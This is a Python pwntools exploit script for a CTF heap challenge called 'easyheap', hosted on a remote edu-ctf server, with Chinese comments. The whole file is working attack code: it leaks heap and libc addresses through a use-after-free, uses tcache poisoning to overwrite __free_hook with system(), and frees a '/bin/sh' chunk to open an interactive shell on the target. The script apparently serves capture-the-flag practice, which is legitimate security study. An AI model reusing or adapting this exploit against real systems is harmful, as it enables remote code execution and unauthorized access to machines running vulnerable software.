from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux','splitw','-h']

# r = process("./easyheap")
r = remote("edu-ctf.zoolab.org",30211)

def add_book(idx,namelen,name="dummy"):
    r.sendlineafter("> ",str(1))
    r.sendlineafter("Index: ",str(idx))
    r.sendlineafter("Length of name: ",str(namelen))
    r.sendlineafter("Name: ",name)
    r.sendlineafter("Price: ",str(7))

def delete_book(idx):
    r.sendlineafter("> ",str(2))
    r.sendlineafter("delete: ",str(idx))


def edit_book(idx,name):
    r.sendlineafter("> ",str(3))
    r.sendlineafter("edit: ",str(idx))
    r.sendlineafter("Name: ",name)
    r.sendlineafter("Price: ",str(7))

def list_book():
    r.sendlineafter("> ",str(4))

def get_name_from_idx(idx):
    r.sendlineafter("> ",str(5))
    r.sendlineafter("Index: ",str(idx))


def getHeap():
    add_book(0,0x10)
    delete_book(0)
    list_book()
    r.recvuntil("Index:")
    
    offset = 0x10
    heap = int(r.recvline()[1:-1].decode()) - offset
    # heap =text.ljust(8,b'\x00')
    # heap = text
    # print("heap address",hex(heap))
    print("heap",hex(heap))
    return heap

def getLibc(heap):
    # add_book(4,0x20)
    # delete_book(4)
    add_book(1,0x410) #  讓他進入unsorted bin
    add_book(2,0x10) # 避免上面觸發 consolidate
    delete_book(1)
    delete_book(2)

    add_book(3,0x20,p64(heap+0x2f0)) # 把 books[1]->name改成 進入unsorted bin的那一塊
    get_name_from_idx(1) # UAF 把那一塊上面的值讀出來,是main_area的位址,是在libc那一區塊
    r.recvuntil("Name: ")
    libc_offset =  0x7f16ab185be0 - 0x7f16aaf9a000 
    libc= u64(r.recvline()[:-1].ljust(8,b'\x00'))  - libc_offset
    print("libc",hex(libc))
    # libc = 
    return libc

def free_hook(heap,libc):
    add_book(5,0x10) # allocate 給 books[1] 去操作fd的
    edit_book(3,p64(heap+0x2d0)) # 把books[1] 的name 改成 
    #books[5]的name 其實只是要讓name可以有個正常可以free的空間

    # 這個book 6是為了讓0x30的count 多一點,如果是0就無法allocate
    add_book(6,0x10)
    delete_book(6)

    delete_book(1) # free book[1]
    edit_book(3,p64(__free_hook - 8)) # 更改book[1] 的 fd

    add_book(4,0x28,b'/bin/sh\x00' + p64(_system)) # 取得book[1] 和我們要串改的free_hook address  並寫入值
    delete_book(4) 
    


heap = getHeap()
libc = getLibc(heap)

_system = libc + 0x55410
__free_hook = libc + 0x1eeb28
one_shot = libc + 0xe6c84
binsh = libc + 0x1b75aa

free_hook(heap,libc)

r.interactive()

